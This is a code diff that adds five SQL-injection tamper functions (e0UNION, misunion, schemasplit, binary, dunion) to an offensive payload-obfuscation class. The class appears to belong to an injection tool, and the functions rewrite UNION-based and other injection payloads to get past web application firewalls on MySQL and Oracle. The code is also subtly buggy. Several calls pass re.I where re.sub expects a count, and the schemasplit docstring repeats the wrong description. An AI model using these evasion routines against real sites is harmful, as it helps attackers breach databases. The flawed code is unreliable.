@@ -87,7 +87,8 @@ class SQLiTamper():
                     self.modsecurityversioned, self.lowercase, self.least, self.informationschemacomment, self.ifnull2ifisnull, self.ifnull2casewhenisnull, \
                     self.htmlencode, self.hex2char, self.halfversionedmorekeywords, self.greatest, self.escapequotes, self.equaltolike, self.concat2concatws, \
                     self.commentbeforeparentheses, self.commalessmid, self.commalesslimit, self.charunicodeescape, self.charunicodeencode, self.charencode, \
-                    self.bluecoat, self.between, self.appendnullbyte, self.apostrophenullencode, self.apostrophemask]
+                    self.bluecoat, self.between, self.appendnullbyte, self.apostrophenullencode, self.apostrophemask, self.e0UNION,
+                    self.misunion, self.schemasplit, self.binary, self.dunion]
         self._General = [self.chardoubleencode, self.unmagicquotes, self.unionalltounion, self.symboliclogical, \
                         self.space2plus, self.randomcomments, self.randomcase, self.overlongutf8more, self.overlongutf8, \
                         self.multiplespaces, self.htmlencode, self.escapequotes, self.charunicodeescape, self.apostrophenullencode, \
@@ -102,17 +103,18 @@ class SQLiTamper():
                         self.space2dash, self.space2comment, self.sp_password, self.plus2fnconcat, self.plus2concat, self.percentage, \
                         self.lowercase, self.equaltolike, self.commentbeforeparentheses, self.charunicodeencode, self.charencode, \
                         self.between, self.greatest, self.multiplespaces, self.randomcase, self.space2plus, self.unionalltounion, \
-                        self.unmagicquotes]
+                        self.unmagicquotes, self.e0UNION]
         self._MySQL = [self.versionedmorekeywords, self.versionedkeywords, self.uppercase, self.space2randomblank, self.space2mysqldash, \
                         self.space2mysqlblank, self.space2mssqlhash, self.space2morehash, self. space2morecomment, self. space2hash, \
                         self.space2comment, self.percentage, self.modsecurityzeroversioned, self.modsecurityversioned, self.lowercase, \
                         self.least, self.informationschemacomment, self.ifnull2ifisnull, self.ifnull2casewhenisnull, self.hex2char, \
                         self.halfversionedmorekeywords, self.greatest, self.equaltolike, self.concat2concatws, self.commentbeforeparentheses, \
                         self.commalessmid, self.commalesslimit, self.charunicodeencode, self.charencode, self.bluecoat, self.between, self.multiplespaces, \
-                        self.randomcase, self.space2comment, self.space2plus, self.unionalltounion, self.unmagicquotes]
+                        self.randomcase, self.space2comment, self.space2plus, self.unionalltounion, self.unmagicquotes, self.e0UNION,
+                        self.misunion, self.schemasplit, self.binary]
         self._Oracle = [self.uppercase, self.space2randomblank, self.space2comment, self.lowercase, self.least, self.greatest, \
                         self.commentbeforeparentheses, self.charencode, self.between, self.equaltolike, self.multiplespaces, \
-                        self.randomcase, self.space2plus, self.unionalltounion, self.unmagicquotes]
+                        self.randomcase, self.space2plus, self.unionalltounion, self.unmagicquotes, self.dunion]
         self._PostgreSQL= [self.uppercase, self.substring2leftright, self.space2randomblank, self.space2comment, self.percentage, \
                         self.lowercase, self.least, self.greatest, self.commentbeforeparentheses, self.charunicodeencode, \
                         self.charencode, self.between, self.equaltolike, self.multiplespaces, self.randomcase, self.space2plus]
@@ -1710,3 +1712,99 @@ class SQLiTamper():
         """
 
         return payload.replace('\'', "%EF%BC%87") if payload else payload
+
+    def e0UNION(self, payload, **kwargs):
+        """
+        Replaces instances of <int> UNION with <int>e0UNION
+
+        Requirement:
+            * MySQL
+            * MsSQL
+
+        Notes:
+            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf
+
+        >>> tamper('1 UNION ALL SELECT')
+        '1e0UNION ALL SELECT'
+        """
+
+        return re.sub("(\d+)\s+(UNION )", r"\g<1>e0\g<2>", payload, re.I) if payload else payload
+
+    def misunion(self, payload, **kwargs):
+        """
+        Replaces instances of UNION with -.1UNION
+
+        Requirement:
+            * MySQL
+
+        Notes:
+            * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf
+
+        >>> tamper('1 UNION ALL SELECT')
+        '1-.1UNION ALL SELECT'
+        >>> tamper('1" UNION ALL SELECT')
+        '1"-.1UNION ALL SELECT'
+        """
+
+        return re.sub("\s+(UNION )", r"-.1\g<1>", payload, re.I) if payload else payload
+
+    def schemasplit(self, payload, **kwargs):
+        """
+        Replaces instances of <int> UNION with <int>e0UNION
+
+        Requirement:
+            * MySQL
+
+        Notes:
+            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf
+
+        >>> tamper('SELECT id FROM testdb.users')
+        'SELECT id FROM testdb 9.e.users'
+        """
+
+        return re.sub("( FROM \w+)\.(\w+)", r"\g<1> 9.e.\g<2>", payload, re.I) if payload else payload
+
+    def binary(self, payload, **kwargs):
+        """
+        Injects keyword binary where possible
+
+        Requirement:
+            * MySQL
+
+        >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
+        '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
+        >>> tamper('1 AND 2>1')
+        '1 AND binary 2>binary 1'
+        >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
+        'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'
+        """
+
+        retVal = payload
+
+        if payload:
+            retVal = re.sub(r"\bNULL\b", "binary NULL", retVal)
+            retVal = re.sub(r"\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)", r"\g<1>binary \g<2>\g<3>binary \g<4>", retVal)
+            retVal = re.sub(r"(\d+\s*[>=]\s*)(\d+)", r"binary \g<1>binary \g<2>", retVal)
+            retVal = re.sub(r"\b((AND|OR)\s*)(\d+)", r"\g<1>binary \g<3>", retVal)
+            retVal = re.sub(r"([>=]\s*)(\d+)", r"\g<1>binary \g<2>", retVal)
+            retVal = re.sub(r"\b(0x[0-9a-f]+)", r"binary \g<1>", retVal)
+            retVal = re.sub(r"(\s+binary)+", r"\g<1>", retVal)
+
+        return retVal
+
+    def dunion(self, payload, **kwargs):
+        """
+        Replaces instances of <int> UNION with <int>DUNION
+
+        Requirement:
+            * Oracle
+
+        Notes:
+            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf
+
+        >>> tamper('1 UNION ALL SELECT')
+        '1DUNION ALL SELECT'
+        """
+
+        return re.sub("(\d+)\s+(UNION )", r"\g<1>D\g<2>", payload, re.I) if payload else payload
+
